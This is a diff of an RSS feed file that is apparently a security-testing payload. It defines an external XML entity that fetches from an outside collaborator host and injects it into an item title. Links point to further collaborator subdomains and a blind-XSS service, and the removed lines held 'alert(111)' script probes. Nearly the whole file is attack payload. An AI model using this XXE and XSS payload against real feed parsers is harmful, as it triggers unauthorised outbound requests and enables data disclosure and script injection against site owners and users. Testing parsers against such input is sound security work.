@@ -3,16 +3,16 @@
 <!ENTITY xxe SYSTEM "http://ig2saxscwn5oluub82rf7he2atgj48.cigitalcollaborator.com/aswd" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title>alert(111)</title>
+    <title>abc</title>
     <link>http://mc2w61ogsr1shyqf46nj3la66xcr0g.cigitalcollaborator.com/</link>
-    <description>alert(111)</description>
-    <lastBuildDate>Thu, 11 Jun 2020 00:00:00 -0000</lastBuildDate>
+    <description>def</description>
+    <lastBuildDate>Fri, 12 Jun 2020 00:00:00 -0000</lastBuildDate>
     <item>
         <title>&xxe;</title>
         <link>http://d0enusc7gipj5pe6sxbarcyxuo0fo4.cigitalcollaborator.com</link>
         <description>https://game0ver.xss.ht</description>
         <author>author@example.com</author>
-        <pubDate>Thu, 11 Jun 2020 00:00:00 -0000</pubDate>
+        <pubDate>Fri, 12 Jun 2020 00:00:00 -0000</pubDate>
     </item>
 </channel>
 </rss>
